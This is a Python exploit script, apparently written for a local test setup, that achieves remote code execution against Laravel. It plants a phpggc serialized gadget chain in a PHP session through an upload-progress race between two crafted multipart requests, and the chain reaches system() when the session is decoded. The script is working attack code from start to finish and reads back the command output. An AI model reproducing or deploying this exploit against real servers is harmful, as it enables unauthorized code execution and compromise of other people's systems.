#!/usr/bin/env python3
"""Laravel RCE22 (PendingBroadcast + CommonMark Environment) via the pre-RINIT
handler-mismatch path. The serialized object comes from phpggc; the preloaded
Composer autoloader resolves the classes during the pre-RINIT session decode;
PendingBroadcast::__destruct then dispatches through the environment and reaches
system() at the read request's shutdown.

Usage: chain_e3.py <port> [payload-file]
"""
import os
import socket
import sys
import time

port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
payload_file = sys.argv[2] if len(sys.argv) > 2 else "/tmp/laravel.payload"
payload = open(payload_file, "rb").read().strip()
sid = "laravele" + "".join("%02x" % b for b in os.urandom(10))
progress = b"x|" + payload
boundary = b"----chainL"

prefix = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
    + progress + b"\r\n"
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="f"; filename="t"\r\n'
    b"Content-Type: application/octet-stream\r\n\r\n"
    b"Z" * 64
)
total = len(prefix) + 200000

w = socket.create_connection(("127.0.0.1", port), timeout=10)
w.sendall(
    b"POST /chainW/up.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(total).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + prefix
)
time.sleep(0.8)

body = (
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    b"--" + boundary + b"\r\n"
    b'Content-Disposition: form-data; name="g"; filename="u"\r\n\r\nZ\r\n'
    b"--" + boundary + b"--\r\n"
)
r = socket.create_connection(("127.0.0.1", port), timeout=10)
r.sendall(
    b"POST /chainR/plain.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
    b"Cookie: PHPSESSID=" + sid.encode() + b"\r\n"
    b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
    b"Content-Length: " + str(len(body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + body
)
resp = b""
try:
    while True:
        c = r.recv(65536)
        if not c:
            break
        resp += c
except socket.timeout:
    pass
r.close()
w.close()
head, _, out = resp.partition(b"\r\n\r\n")
print(head.split(b"\r\n", 1)[0].decode("latin-1"))
print(out.decode("latin-1", "replace"))
